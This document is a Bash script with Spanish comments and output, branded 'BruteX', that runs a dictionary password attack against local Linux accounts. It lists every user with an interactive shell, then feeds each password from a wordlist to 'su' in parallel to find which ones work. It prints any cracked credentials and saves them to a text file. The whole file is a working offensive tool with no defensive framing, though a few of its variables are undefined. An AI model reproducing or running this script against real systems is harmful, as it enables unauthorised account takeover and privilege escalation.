#!/bin/bash

# Configuración de colores y símbolos
readonly RED="\033[1;31m"
readonly GREEN="\033[1;32m"
readonly YELLOW="\033[1;33m"
readonly BLUE="\033[1;34m"
readonly CYAN="\033[1;36m"
readonly PURPLE="\033[1;35m"
readonly RESET="\033[0m"

# Símbolos personalizados
readonly BULLET="🔹"
readonly USER_ICON="👤"
readonly LOCK_ICON="🔓"
readonly FOUND_ICON="✅"
readonly WARNING_ICON="⚠️"
readonly SEARCH_ICON="🔎"
readonly FAIL_ICON="❌"
readonly PROGRESS_ICON="📊"

# Variables globales
declare -A credenciales_encontradas
declare -a usuarios_interactivos
DICCIONARIO=""
PARAR=0
trap ctrl_c INT

function banner() {
  clear
  echo -e "${PURPLE}                                                                                ${RESET}"
  echo -e "${PURPLE} ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██╗  ██╗${RESET}"
  echo -e "${PURPLE} ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝╚██╗██╔╝${RESET}"
  echo -e "${PURPLE} ██████╔╝██████╔╝██║   ██║   ██║   █████╗   ╚███╔╝ ${RESET}"
  echo -e "${PURPLE} ██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝   ██╔██╗ ${RESET}"
  echo -e "${PURPLE} ██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██╔╝ ██╗${RESET}"
  echo -e "${PURPLE} ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝  ╚═╝${RESET}"
  echo -e "${YELLOW}                     BruteX - Ultimate Password Cracker${RESET}"
  echo -e "${CYAN}                Herramienta avanzada de Ataque de Diccionario by MatthyGD${RESET}\n"
}

function mostrar_ayuda() {
  echo -e "${BULLET} ${CYAN}Uso:${RESET} ${BLUE}$0 -d <diccionario>${RESET}"
  echo -e "${BULLET} ${CYAN}Opciones:${RESET}"
  echo -e "  ${BULLET} ${YELLOW}-d${RESET}   Especifica el archivo diccionario a usar"
  echo -e "  ${BULLET} ${YELLOW}-h${RESET}   Muestra este mensaje de ayuda"
  echo -e "${PURPLE}──────────────────────────────────────────────────────${RESET}"
}

function info() {
  echo -e "${BULLET} ${CYAN}Diccionario:${RESET} ${BLUE}${DICCIONARIO}${RESET}"
  echo -e "${BULLET} ${CYAN}Tamaño del diccionario:${RESET} ${BLUE}$(wc -l < "$DICCIONARIO") líneas${RESET}"
  echo -e "${BULLET} ${CYAN}Usuarios detectados:${RESET} ${BLUE}${#usuarios_interactivos[@]}${RESET}"
  echo -e "${PURPLE}──────────────────────────────────────────────────────${RESET}\n"
}

function ctrl_c() {
  echo -e "\n${WARNING_ICON} ${RED}Interrupción recibida! Deteniendo inmediatamente...${RESET}"
  PARAR=1
  mostrar_resultados
  tput cnorm
  exit 1
}

function detectar_usuarios() {
  echo -e "${SEARCH_ICON} ${CYAN}Detectando usuarios con shells interactivos...${RESET}"
  
  # Detección más robusta de usuarios
  mapfile -t usuarios_interactivos < <(getent passwd | awk -F: '$7 ~ /(\/bash|\/sh|\/zsh)$/ {print $1}')
  
  # Verificación adicional para sistemas con /etc/passwd diferente
  if [ ${#usuarios_interactivos[@]} -eq 0 ]; then
    echo -e "${WARNING_ICON} ${YELLOW}Primer método no encontró usuarios, intentando alternativa...${RESET}"
    mapfile -t usuarios_interactivos < <(getent passwd | awk -F: '$3 >= 1000 && $3 <= 60000 {print $1}' | grep -v '^nobody$')
  fi
  
  if [ ${#usuarios_interactivos[@]} -eq 0 ]; then
    echo -e "${FAIL_ICON} ${RED}No se encontraron usuarios con shells interactivos${RESET}"
    exit 1
  fi
  
  echo -e "\n${LOCK_ICON} ${GREEN}Usuarios detectados (${#usuarios_interactivos[@]}):${RESET}"
  for usuario in "${usuarios_interactivos[@]}"; do
    shell=$(getent passwd "$usuario" | cut -d: -f7)
    home=$(getent passwd "$usuario" | cut -d: -f6)
    echo -e "  ${BULLET} ${USER_ICON} ${CYAN}${usuario}${RESET}"
    echo -e "     ↳ ${YELLOW}Shell:${RESET} ${BLUE}${shell}${RESET}"
    echo -e "     ↳ ${YELLOW}Home:${RESET} ${BLUE}${home}${RESET}"
  done
  echo -e "${PURPLE}──────────────────────────────────────────────────────${RESET}"
}

function probar_credenciales() {
  local diccionario=$1
  local total_lineas=$(wc -l < "$diccionario")
  local linea=0
  local inicio=$(date +%s)
  local num_cores=$(nproc)
  local hilos=$((num_cores * 2))  # Usamos el doble de núcleos disponibles para hilos
  
  echo -e "\n${SEARCH_ICON} ${YELLOW}Iniciando el ataque con BruteX...${RESET}"
  echo -e "${PURPLE}──────────────────────────────────────────────────────${RESET}"
  
  # Función que se ejecutará en cada hilo
  probar_en_hilo() {
    local usuario=$1
    local contrasena=$2
    [ $PARAR -eq 1 ] && return
    
    if echo "$contrasena" | timeout 0.1 su "$usuario" -c 'exit' 2>/dev/null; then
      if [ -z "${credenciales_encontradas[$usuario]}" ]; then
        credenciales_encontradas["$usuario"]="$contrasena"
        echo -e "\n${FOUND_ICON} ${GREEN}¡Credencial comprometida!${RESET}"
        echo -e "   ${CYAN}Usuario:${RESET} ${BLUE}${usuario}${RESET}"
        echo -e "   ${CYAN}Contraseña:${RESET} ${GREEN}${contrasena}${RESET}"
        echo -e "   ${CYAN}Hora:${RESET} ${BLUE}$(date)${RESET}"
        
        # Si encontramos todas las credenciales, salir
        if [ ${#credenciales_encontradas[@]} -eq ${#usuarios_interactivos[@]} ]; then
          PARAR=1
        fi
      fi
    fi
  }
  
  # Exportar funciones y variables necesarias
  export -f probar_en_hilo
  export PARAR
  export credenciales_encontradas
  
  while IFS= read -r contrasena && [ $PARAR -eq 0 ]; do
    linea=$((linea + 1))
    porcentaje=$((linea * 100 / total_lineas))
    
    # Mostrar progreso con información detallada
    tiempo_transcurrido=$(( $(date +%s) - inicio ))
    tiempo_estimado=$(( tiempo_transcurrido * (total_lineas - linea) / linea )) 2>/dev/null
    tiempo_formato=$(printf "%02d:%02d:%02d" $((tiempo_estimado/3600)) $((tiempo_estimado%3600/60)) $((tiempo_estimado%60)))
    
    echo -ne "\r${PROGRESS_ICON} ${CYAN}Progreso:${RESET} ${BLUE}${porcentaje}%${RESET} | ${CYAN}Línea:${RESET} ${BLUE}${linea}/${total_lineas}${RESET} | ${CYAN}ETA:${RESET} ${BLUE}${tiempo_formato}${RESET} | ${CYAN}Probando:${RESET} ${YELLOW}${contrasena}${RESET}"
    
    # Usar xargs para procesar en paralelo
    printf "%s\n" "${usuarios_interactivos[@]}" | xargs -P $hilos -I {} bash -c 'probar_en_hilo "{}" "'"$contrasena"'"'
    
  done < "$diccionario"
  
  echo -e "\n${PURPLE}──────────────────────────────────────────────────────${RESET}"
}

function mostrar_resultados() {
  echo -e "\n${LOCK_ICON} ${YELLOW}🔓 RESUMEN FINAL DEL ATAQUE 🔓${RESET}"
  echo -e "${PURPLE}──────────────────────────────────────────────────────${RESET}"
  
  if [ ${#credenciales_encontradas[@]} -gt 0 ]; then
    echo -e "${CRACKED_ICON} ${GREEN}¡ATAQUE EXITOSO!${RESET} ${HAPPY_ICON}"
    echo -e "${CYAN}Credenciales comprometidas encontradas:${RESET} ${GREEN}${#credenciales_encontradas[@]}${RESET}"
    
    # Crear archivo con las credenciales encontradas
    local archivo_resultados="credenciales_comprometidas_$(date +%Y%m%d_%H%M%S).txt"
    {
      echo "╔════════════════════════════════════════╗"
      echo "║    CREDENCIALES COMPROMETIDAS - $(date +"%Y-%m-%d %H:%M:%S") ║"
      echo "╠════════════════════════════════════════╣"
      for usuario in "${!credenciales_encontradas[@]}"; do
        echo "║  Usuario: ${usuario}"
        echo "║  Contraseña: ${credenciales_encontradas[$usuario]}"
        echo "║────────────────────────────────────────║"
      done
      echo "╚════════════════════════════════════════╝"
    } > "$archivo_resultados"
    
    echo -e "\n${BULLET} ${CYAN}Las credenciales se han guardado en:${RESET} ${BLUE}${archivo_resultados}${RESET}"
    
    # Mostrar resumen en pantalla
    for usuario in "${!credenciales_encontradas[@]}"; do
      echo -e "  ${FOUND_ICON} ${CYAN}Usuario:${RESET} ${BLUE}${usuario}${RESET}"
      echo -e "     ${BULLET} ${GREEN}Contraseña:${RESET} ${YELLOW}${credenciales_encontradas[$usuario]}${RESET}"
    done
  else
    echo -e "${SAD_ICON} ${YELLOW}El ataque no encontró credenciales válidas${RESET} ${SAD_ICON}"
    echo -e "${BULLET} ${CYAN}Se probaron ${BLUE}${linea}${CYAN} contraseñas de ${BLUE}${total_lineas}${CYAN} en el diccionario${RESET}"
    echo -e "${BULLET} ${CYAN}Usuarios probados:${RESET} ${BLUE}${#usuarios_interactivos[@]}${RESET}"
  fi
  
  local restantes=$(( ${#usuarios_interactivos[@]} - ${#credenciales_encontradas[@]} ))
  if [ $restantes -gt 0 ] && [ $PARAR -eq 0 ]; then
    echo -e "\n${WARNING_ICON} ${YELLOW}${restantes} usuarios resistieron el ataque${RESET}"
  elif [ $restantes -gt 0 ]; then
    echo -e "\n${WARNING_ICON} ${YELLOW}Ataque interrumpido - ${restantes} usuarios no fueron probados completamente${RESET}"
  fi
  
  echo -e "${PURPLE}──────────────────────────────────────────────────────${RESET}"
  echo -e "${CLOCK_ICON} ${CYAN}Tiempo total de ejecución:${RESET} ${BLUE}$(date -u -d @$(($(date +%s)-inicio)) +'%H:%M:%S')${RESET}"
  echo -e "${PURPLE}──────────────────────────────────────────────────────${RESET}"
}

# Main
while getopts ":d:h" opt; do
  case $opt in
    d) DICCIONARIO="$OPTARG" ;;
    h) banner; mostrar_ayuda; exit 0 ;;
    *) echo -e "${FAIL_ICON} ${RED}Opción inválida: -$OPTARG${RESET}"; mostrar_ayuda; exit 1 ;;
  esac
done

if [ -z "$DICCIONARIO" ]; then
  banner
  mostrar_ayuda
  exit 0
fi

if [ ! -f "$DICCIONARIO" ]; then
  echo -e "${FAIL_ICON} ${RED}El archivo diccionario no existe${RESET}"
  exit 1
fi

banner
detectar_usuarios
info
probar_credenciales "$DICCIONARIO"
mostrar_resultados

tput cnorm
